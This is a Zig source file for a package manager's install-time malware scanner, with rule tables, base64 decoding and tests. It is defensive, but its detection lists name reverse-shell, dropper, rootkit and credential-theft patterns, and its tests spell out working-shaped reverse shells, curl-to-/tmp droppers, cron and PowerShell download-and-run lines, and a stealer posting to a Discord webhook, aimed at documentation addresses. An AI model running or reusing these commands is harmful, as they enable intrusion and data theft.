//! Install-time malware scan.
//!
//! Every file of a package is read once and matched against a fixed set of
//! byte patterns. Patterns alone are weak evidence: ordinary programs name
//! AWS_SECRET_ACCESS_KEY, ~/.ssh/id_rsa or crontab. So findings come from
//! *rules*, each of which needs one or more groups of patterns to appear in the
//! same file ("downloads something" AND "makes it executable in /tmp" AND
//! "runs it in the background"). A strong rule blocks the install; a weak one
//! is only reported by `abv0 detect`.
//!
//! Rules marked `.script` apply only to text files (no NUL byte in the first
//! 4 KiB), where these commands are actually run. A large compiled program
//! often carries such strings as data (a security scanner's signatures, a
//! shell's documentation), and must not be judged by them.
//!
//! Text files also have their long base64 runs decoded and scanned, because
//! droppers hide their real commands that way (`echo <base64> | base64 -d | sh`).
//!
//! This is a heuristic scan, not an antivirus: it recognises known malicious
//! behaviour, and code written to evade it can.

const std = @import("std");

pub const Scope = enum { any, script };

const Group = struct {
    pats: []const []const u8,
    /// How many distinct patterns of this group must appear.
    need: u8 = 1,
};

const Rule = struct {
    reason: []const u8,
    strong: bool,
    scope: Scope = .any,
    groups: []const Group,
};

const download = [_][]const u8{ "curl ", "wget ", "Invoke-WebRequest", "DownloadFile(", "fetch(\"http" };
const pipe_exec = [_][]const u8{ "| sh", "|sh", "| bash", "|bash", "chmod +x" };

pub const rules = [_]Rule{
    // ---- strong: block the install ----
    .{ .reason = "reverse shell (gives a remote attacker a shell)", .strong = true, .groups = &.{.{ .pats = &.{
        "bash -i >& /dev/tcp/",  "/sh -i >& /dev/tcp/",    "0>&1 | nc ",           "nc -e /bin/sh",
        "nc -e /bin/bash",       "ncat -e /bin/",          "|/bin/sh -i 2>&1|nc ", "/bin/sh -i 2>&1 | nc ",
        "os.dup2(s.fileno(),0)", "os.dup2(s.fileno(), 0)",
    } }} },
    .{ .reason = "PowerShell reverse shell", .strong = true, .scope = .script, .groups = &.{
        .{ .pats = &.{"System.Net.Sockets.TCPClient("} },
        .{ .pats = &.{".GetStream()"} },
        .{ .pats = &.{ "iex ", "iex(", "Invoke-Expression" } },
    } },
    .{ .reason = "cryptocurrency miner (mining pool address)", .strong = true, .groups = &.{.{ .pats = &.{
        "stratum+tcp://", "stratum+ssl://", "stratum2+tcp://", "donate.v2.xmrig.com", "donate.ssl.xmrig.com",
    } }} },
    .{ .reason = "dropper (downloads a program to a temp folder and runs it in the background)", .strong = true, .scope = .script, .groups = &.{
        .{ .pats = &download },
        .{ .pats = &.{ "chmod +x /tmp/", "chmod 777 /tmp/", "chmod +x /var/tmp/", "chmod 777 /var/tmp/", "chmod +x /dev/shm/", "chmod 777 /dev/shm/" } },
        .{ .pats = &.{ "nohup ", ">/dev/null 2>&1 &", "> /dev/null 2>&1 &", "& disown" } },
    } },
    .{ .reason = "starts itself at every boot and runs downloaded code (cron @reboot)", .strong = true, .scope = .script, .groups = &.{
        .{ .pats = &.{"@reboot"} },
        .{ .pats = &download },
        .{ .pats = &pipe_exec },
    } },
    .{ .reason = "rootkit (forces a library into every program via /etc/ld.so.preload)", .strong = true, .scope = .script, .groups = &.{.{ .pats = &.{
        "> /etc/ld.so.preload",   ">/etc/ld.so.preload",       ">> /etc/ld.so.preload", ">>/etc/ld.so.preload",
        "tee /etc/ld.so.preload", "tee -a /etc/ld.so.preload",
    } }} },
    .{ .reason = "macOS login item that runs a downloaded file from a temp folder", .strong = true, .scope = .script, .groups = &.{
        .{ .pats = &.{ "Library/LaunchAgents", "Library/LaunchDaemons" } },
        .{ .pats = &.{"RunAtLoad"} },
        .{ .pats = &.{ "/tmp/", "/Users/Shared/" } },
        .{ .pats = &download },
    } },
    .{ .reason = "Windows startup entry that runs hidden or downloaded PowerShell", .strong = true, .scope = .script, .groups = &.{
        .{ .pats = &.{"CurrentVersion\\Run"} },
        .{ .pats = &.{ "powershell", "mshta", "rundll32" } },
        .{ .pats = &.{ "-enc ", "-EncodedCommand", "FromBase64String", "DownloadString(", "http://", "https://" } },
    } },
    .{ .reason = "runs hidden (base64-encoded) commands", .strong = true, .scope = .script, .groups = &.{.{ .pats = &.{
        "base64 -d | sh",              "base64 -d | bash",                     "base64 -d|sh",         "base64 -d|bash",
        "base64 --decode | sh",        "base64 --decode | bash",               "base64 --decode|bash", "base64 -D | sh",
        "exec(base64.b64decode(",      "exec(__import__('base64').b64decode(", "eval(base64_decode(",  "IEX([System.Text.Encoding]",
        "iex ([System.Text.Encoding]",
    } }} },
    .{ .reason = "downloads and runs PowerShell code in memory", .strong = true, .scope = .script, .groups = &.{
        .{ .pats = &.{ "IEX(", "IEX (", "Invoke-Expression" } },
        .{ .pats = &.{ "DownloadString(", "Net.WebClient" } },
    } },
    .{ .reason = "password or crypto-wallet stealer (collects saved secrets and sends them out)", .strong = true, .groups = &.{
        .{ .pats = &stealer_targets, .need = 4 },
        .{ .pats = &exfil },
    } },

    // ---- weak: only reported by `abv0 detect` ----
    .{ .reason = "reads many browser or wallet secret files", .strong = false, .groups = &.{.{ .pats = &stealer_targets, .need = 5 }} },
    .{ .reason = "can send data to a chat webhook or paste site", .strong = false, .groups = &.{.{ .pats = &exfil }} },
    .{ .reason = "mentions the shadow password file", .strong = false, .groups = &.{.{ .pats = &.{"/etc/shadow"} }} },
    .{ .reason = "mentions an SSH private key path", .strong = false, .groups = &.{.{ .pats = &.{"/.ssh/id_rsa"} }} },
    .{ .reason = "mentions cloud credentials", .strong = false, .groups = &.{.{ .pats = &.{"AWS_SECRET_ACCESS_KEY"} }} },
    .{ .reason = "pipes a download straight into a shell", .strong = false, .scope = .script, .groups = &.{
        .{ .pats = &download },
        .{ .pats = &.{ "| sh", "|sh", "| bash", "|bash" } },
    } },
};

const stealer_targets = [_][]const u8{
    "Login Data",                       "Web Data",               "Local State",           "wallet.dat",
    ".aws/credentials",                 "login.keychain",         "exodus.wallet",         "Electrum/wallets",
    "nkbihfbeogaeaoehlefnkodbefgpgknn", "Telegram Desktop/tdata", "Local Storage/leveldb", "Cookies.binarycookies",
    "key4.db",                          "logins.json",            "/.ssh/id_rsa",
};

const exfil = [_][]const u8{
    "discord.com/api/webhooks/", "discordapp.com/api/webhooks/", "api.telegram.org/bot", "pastebin.com/api",
    "transfer.sh/",              "anonfiles.com",                "file.io/",
};

// ---------------------------------------------------------------------------
// Compiled tables
// ---------------------------------------------------------------------------

pub const Mask = u128;

/// Every distinct pattern used by any rule.
pub const patterns = blk: {
    @setEvalBranchQuota(200_000);
    var list: []const []const u8 = &.{};
    for (rules) |r| for (r.groups) |g| for (g.pats) |p| {
        var dup = false;
        for (list) |q| {
            if (std.mem.eql(u8, p, q)) dup = true;
        }
        if (!dup) list = list ++ .{p};
    };
    if (list.len > @bitSizeOf(Mask)) @compileError("too many scan patterns for the mask type");
    break :blk list;
};

fn patternBit(comptime p: []const u8) Mask {
    @setEvalBranchQuota(200_000);
    for (patterns, 0..) |q, i| {
        if (std.mem.eql(u8, p, q)) return @as(Mask, 1) << @intCast(i);
    }
    unreachable;
}

const CompiledGroup = struct { mask: Mask, need: u8 };
const CompiledRule = struct { groups: []const CompiledGroup };

const compiled = blk: {
    @setEvalBranchQuota(200_000);
    var out: [rules.len]CompiledRule = undefined;
    for (rules, 0..) |r, i| {
        var gs: [r.groups.len]CompiledGroup = undefined;
        for (r.groups, 0..) |g, j| {
            var m: Mask = 0;
            for (g.pats) |p| m |= patternBit(p);
            gs[j] = .{ .mask = m, .need = g.need };
        }
        const frozen = gs;
        out[i] = .{ .groups = &frozen };
    }
    break :blk out;
};

/// Bit i is set when `patterns[i]` begins with that byte.
const first_byte = blk: {
    var t = [_]Mask{0} ** 256;
    for (patterns, 0..) |p, i| t[p[0]] |= @as(Mask, 1) << @intCast(i);
    break :blk t;
};

const longest = blk: {
    var n: usize = 0;
    for (patterns) |p| n = @max(n, p.len);
    break :blk n;
};

pub const chunk = 256 * 1024;
pub const overlap = longest - 1;
/// Text files up to this size are read whole, so base64 runs can be decoded.
const max_text = 8 * 1024 * 1024;
const min_base64_run = 80;

// ---------------------------------------------------------------------------
// Matching
// ---------------------------------------------------------------------------

/// Patterns that occur in `bytes`, as a mask.
pub fn scanSlice(bytes: []const u8) Mask {
    return scanInto(bytes, 0, bytes.len);
}

/// Patterns starting at positions `[0, limit)` of `bytes` (a match may run
/// past `limit` but not past `bytes.len`).
fn scanInto(bytes: []const u8, seen_in: Mask, limit: usize) Mask {
    var seen = seen_in;
    for (bytes[0..limit], 0..) |b, pos| {
        var c = first_byte[b] & ~seen;
        while (c != 0) {
            const i: usize = @ctz(c);
            c &= c - 1;
            if (std.mem.startsWith(u8, bytes[pos..], patterns[i])) seen |= @as(Mask, 1) << @intCast(i);
        }
    }
    return seen;
}

/// Streamed scan of a whole file, with an overlap window so a pattern across
/// a read boundary is still found. `buf` holds `chunk + overlap` bytes.
pub fn scanFile(file: std.fs.File, buf: []u8) !Mask {
    var seen: Mask = 0;
    var carry: usize = 0;
    while (true) {
        const n = try file.read(buf[carry..]);
        if (n == 0) break;
        const filled = carry + n;
        seen = scanInto(buf[0..filled], seen, filled);
        carry = @min(overlap, filled);
        std.mem.copyForwards(u8, buf[0..carry], buf[filled - carry ..][0..carry]);
    }
    return seen;
}

fn fires(i: usize, mask: Mask, is_script: bool) bool {
    if (rules[i].scope == .script and !is_script) return false;
    for (compiled[i].groups) |g| {
        if (@popCount(mask & g.mask) < g.need) return false;
    }
    return true;
}

/// Bit i set when `rules[i]` fires on `mask`.
pub fn evaluate(mask: Mask, is_script: bool) u64 {
    var out: u64 = 0;
    for (0..rules.len) |i| {
        if (fires(i, mask, is_script)) out |= @as(u64, 1) << @intCast(i);
    }
    return out;
}

fn isBase64Char(c: u8) bool {
    return std.ascii.isAlphanumeric(c) or c == '+' or c == '/';
}

/// Patterns found inside base64 runs of at least `min_base64_run` characters,
/// decoded once. Gives up after `budget` decoded bytes.
fn scanBase64(text: []const u8, scratch: []u8) Mask {
    var seen: Mask = 0;
    var i: usize = 0;
    while (i < text.len) {
        if (!isBase64Char(text[i])) {
            i += 1;
            continue;
        }
        var j = i;
        while (j < text.len and isBase64Char(text[j])) j += 1;
        const run = text[i..j];
        i = j;
        if (run.len < min_base64_run) continue;
        // Drop a trailing partial quantum; padding, if any, is outside the run.
        const usable = run[0 .. run.len - run.len % 4];
        const dec = std.base64.standard_no_pad.Decoder;
        const n = dec.calcSizeForSlice(usable) catch continue;
        if (n > scratch.len) continue;
        dec.decode(scratch[0..n], usable) catch continue;
        seen |= scanSlice(scratch[0..n]);
    }
    return seen;
}

// ---------------------------------------------------------------------------
// Packages
// ---------------------------------------------------------------------------

pub const Finding = struct {
    reason: []const u8,
    strong: bool,
    /// First file it was found in, relative to the package root.
    file: []const u8,
    /// Found only after decoding base64 text.
    hidden: bool,
};

pub const Result = struct {
    /// A strong rule fired: the install should be refused.
    blocked: bool = false,
    findings: []Finding = &.{},
    files: usize = 0,
    bytes: u64 = 0,
};

/// Scan every regular file under `dir_path` (symlinks are not followed).
/// Allocations come from `a`, which should be an arena.
pub fn scanTree(a: std.mem.Allocator, dir_path: []const u8) !Result {
    var dir = try std.fs.cwd().openDir(dir_path, .{ .iterate = true, .no_follow = true });
    defer dir.close();
    var walker = try dir.walk(a);
    defer walker.deinit();

    const buf = try a.alloc(u8, chunk + overlap);
    var text_buf: ?[]u8 = null;
    var scratch: ?[]u8 = null;

    var fired: u64 = 0;
    var first_file: [rules.len][]const u8 = undefined;
    var hidden_rule: [rules.len]bool = [_]bool{false} ** rules.len;
    var out = Result{};

    while (try walker.next()) |entry| {
        if (entry.kind != .file) continue;
        const file = entry.dir.openFile(entry.basename, .{}) catch continue;
        defer file.close();
        const size = (file.stat() catch continue).size;
        out.files += 1;
        out.bytes += size;

        const head_n = file.read(buf[0..@min(buf.len, 4096)]) catch continue;
        const is_script = head_n > 0 and std.mem.indexOfScalar(u8, buf[0..head_n], 0) == null;
        file.seekTo(0) catch continue;

        var mask: Mask = 0;
        var hidden: Mask = 0;
        if (is_script and size <= max_text) {
            if (text_buf == null) text_buf = try a.alloc(u8, max_text);
            if (scratch == null) scratch = try a.alloc(u8, max_text);
            const n = file.readAll(text_buf.?[0..@intCast(size)]) catch continue;
            const text = text_buf.?[0..n];
            mask = scanSlice(text);
            hidden = scanBase64(text, scratch.?) & ~mask;
        } else {
            mask = scanFile(file, buf) catch continue;
        }

        const plain = evaluate(mask, is_script);
        // Decoded text is code the file runs, so it is judged as a script; with
        // nothing decoded, a binary must not be judged by script-only rules.
        const with_hidden = if (hidden == 0) 0 else evaluate(mask | hidden, true) & ~plain;
        const new = (plain | with_hidden) & ~fired;
        if (new == 0) continue;
        for (0..rules.len) |i| {
            if ((new >> @intCast(i)) & 1 == 0) continue;
            first_file[i] = try a.dupe(u8, entry.path);
            hidden_rule[i] = (with_hidden >> @intCast(i)) & 1 == 1;
        }
        fired |= new;
    }

    var list = std.ArrayList(Finding).init(a);
    for (rules, 0..) |r, i| {
        if ((fired >> @intCast(i)) & 1 == 0) continue;
        if (r.strong) out.blocked = true;
        try list.append(.{ .reason = r.reason, .strong = r.strong, .file = first_file[i], .hidden = hidden_rule[i] });
    }
    out.findings = try list.toOwnedSlice();
    return out;
}

// ---------------------------------------------------------------------------
// Tests
// ---------------------------------------------------------------------------

const testing = std.testing;

fn rulesFor(text: []const u8, is_script: bool) u64 {
    return evaluate(scanSlice(text), is_script);
}

fn strongFires(text: []const u8) bool {
    const r = rulesFor(text, true);
    for (rules, 0..) |rule, i| {
        if (rule.strong and (r >> @intCast(i)) & 1 == 1) return true;
    }
    return false;
}

test "each strong rule catches a sample of the behaviour it describes" {
    // Inert text that has the shape of real attacks; nothing here runs.
    const samples = [_][]const u8{
        "#!/bin/bash\nbash -i >& /dev/tcp/203.0.113.9/4444 0>&1\n",
        "#!/bin/sh\nrm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 203.0.113.9 4444 >/tmp/f\n",
        "#!/bin/sh\nnc -e /bin/sh 203.0.113.9 4444\n",
        "import socket,os;s=socket.socket();s.connect(('203.0.113.9',4444));os.dup2(s.fileno(),0)\n",
        "$c = New-Object System.Net.Sockets.TCPClient('203.0.113.9',4444);$s = $c.GetStream();iex $d\n",
        "{\"url\": \"stratum+tcp://pool.example:3333\"}",
        "\"donate-url\": \"donate.v2.xmrig.com:3333\"",
        "#!/bin/sh\ncurl -s http://203.0.113.9/x -o /tmp/.x\nchmod +x /tmp/.x\nnohup /tmp/.x >/dev/null 2>&1 &\n",
        "#!/bin/sh\n(crontab -l; echo '@reboot curl -fsSL http://203.0.113.9/i | sh') | crontab -\n",
        "#!/bin/sh\necho /lib/libhide.so > /etc/ld.so.preload\n",
        "#!/bin/sh\ncurl -o /tmp/u http://203.0.113.9/u\ncat > ~/Library/LaunchAgents/com.u.plist <<E\n<key>RunAtLoad</key><true/><string>/tmp/u</string>\nE\n",
        "reg add HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Run /v u /d \"powershell -enc SQBFAFgA\"\n",
        "#!/bin/sh\necho Y3VybCBodHRw | base64 -d | sh\n",
        "IEX (New-Object Net.WebClient).DownloadString('http://203.0.113.9/a.ps1')\n",
        "paths = ['Login Data','Local State','wallet.dat','key4.db','logins.json']\nrequests.post('https://discord.com/api/webhooks/1/x', files=f)\n",
    };
    for (samples) |s| {
        if (!strongFires(s)) {
            std.debug.print("not caught: {s}\n", .{s});
            return error.TestUnexpectedResult;
        }
    }
}

test "ordinary installer and tool text does not block" {
    const benign = [_][]const u8{
        // Typical install scripts.
        "#!/bin/sh\ncurl -fsSL https://example.com/install.sh | sh\n",
        "#!/bin/sh\ncurl -LO https://example.com/tool.tar.gz\ntar xzf tool.tar.gz\nchmod +x tool\nmv tool /usr/local/bin\n",
        "#!/bin/sh\nwget -q https://example.com/t -O /tmp/t && chmod +x /tmp/t && /tmp/t --version\n",
        "#!/bin/sh\n(crontab -l; echo '0 3 * * * /usr/local/bin/backup') | crontab -\n",
        "#!/bin/sh\nexport AWS_SECRET_ACCESS_KEY=...\nssh -i ~/.ssh/id_rsa host\n",
        // Fragments that matched real binaries under the old rules.
        "-sync -enable-test-scheme leuvenicehashbang /bin/sh -i",
        // A browser profile tool names a few profile files but sends nothing.
        "Login Data Web Data Local State Cookies",
        "LaunchAgents RunAtLoad /tmp/ curl ",
    };
    for (benign) |s| {
        if (strongFires(s)) {
            std.debug.print("false alarm: {s}\n", .{s});
            return error.TestUnexpectedResult;
        }
    }
}

test "script-only rules ignore the same text inside a binary" {
    const dropper = "curl -s x -o /tmp/x; chmod +x /tmp/x; nohup /tmp/x >/dev/null 2>&1 &";
    try testing.expect(rulesFor(dropper, true) != 0);
    const r = rulesFor(dropper, false);
    for (rules, 0..) |rule, i| {
        if ((r >> @intCast(i)) & 1 == 1) try testing.expect(rule.scope == .any);
    }
}

test "commands hidden in base64 are decoded and caught" {
    const inner = "#!/bin/sh\nbash -i >& /dev/tcp/203.0.113.9/4444 0>&1\n# padding padding padding padding padding\n";
    var enc_buf: [512]u8 = undefined;
    const enc = std.base64.standard.Encoder.encode(&enc_buf, inner);
    var scratch: [512]u8 = undefined;
    try testing.expectEqual(@as(Mask, 0), scanSlice(enc) & patternBit("bash -i >& /dev/tcp/"));
    try testing.expect(scanBase64(enc, &scratch) & patternBit("bash -i >& /dev/tcp/") != 0);
}

test "scanTree reports the file, blocks on strong rules and stays quiet on clean trees" {
    var tmp = testing.tmpDir(.{ .iterate = true });
    defer tmp.cleanup();
    var arena = std.heap.ArenaAllocator.init(testing.allocator);
    defer arena.deinit();
    const a = arena.allocator();

    try tmp.dir.makePath("clean/bin");
    try tmp.dir.writeFile(.{ .sub_path = "clean/bin/tool", .data = "#!/bin/sh\necho hi\n" });
    try tmp.dir.writeFile(.{ .sub_path = "clean/README", .data = "export AWS_SECRET_ACCESS_KEY=... and ~/.ssh/id_rsa" });
    const c = try scanTree(a, try tmp.dir.realpathAlloc(a, "clean"));
    try testing.expect(!c.blocked);
    try testing.expectEqual(@as(usize, 2), c.findings.len);
    try testing.expectEqual(@as(usize, 2), c.files);

    try tmp.dir.makePath("bad/lib");
    try tmp.dir.writeFile(.{ .sub_path = "bad/bin", .data = "ok" });
    try tmp.dir.writeFile(.{ .sub_path = "bad/lib/payload", .data = "x\x00bash -i >& /dev/tcp/10.0.0.1/4444 0>&1\x00y" });
    const b = try scanTree(a, try tmp.dir.realpathAlloc(a, "bad"));
    try testing.expect(b.blocked);
    try testing.expectEqual(@as(usize, 1), b.findings.len);
    try testing.expectEqualStrings("lib/payload", b.findings[0].file);
    try testing.expect(!b.findings[0].hidden);
}

test "a binary carrying script-like text is not judged by script rules" {
    // mise's binary embeds a launchd template next to download code; as data
    // inside a program it must not block.
    var tmp = testing.tmpDir(.{ .iterate = true });
    defer tmp.cleanup();
    var arena = std.heap.ArenaAllocator.init(testing.allocator);
    defer arena.deinit();
    const a = arena.allocator();
    try tmp.dir.makePath("pkg/bin");
    try tmp.dir.writeFile(.{ .sub_path = "pkg/bin/tool", .data = "\x7fELF\x00\x00Library/LaunchAgents RunAtLoad /tmp/ curl -fsSL x | sh chmod +x /tmp/a nohup " });
    const r = try scanTree(a, try tmp.dir.realpathAlloc(a, "pkg"));
    try testing.expect(!r.blocked);
}

test "a pattern across a streamed read boundary is found" {
    var tmp = testing.tmpDir(.{});
    defer tmp.cleanup();
    const pattern = "stratum+tcp://";
    const data = try testing.allocator.alloc(u8, chunk + overlap + 4096);
    defer testing.allocator.free(data);
    const buf = try testing.allocator.alloc(u8, chunk + overlap);
    defer testing.allocator.free(buf);

    const boundary = chunk + overlap;
    var offset: usize = boundary - pattern.len + 1;
    while (offset < boundary) : (offset += 1) {
        @memset(data, 0);
        @memcpy(data[offset..][0..pattern.len], pattern);
        try tmp.dir.writeFile(.{ .sub_path = "f.bin", .data = data });
        const f = try tmp.dir.openFile("f.bin", .{});
        defer f.close();
        try testing.expect(try scanFile(f, buf) & patternBit(pattern) != 0);
    }
}
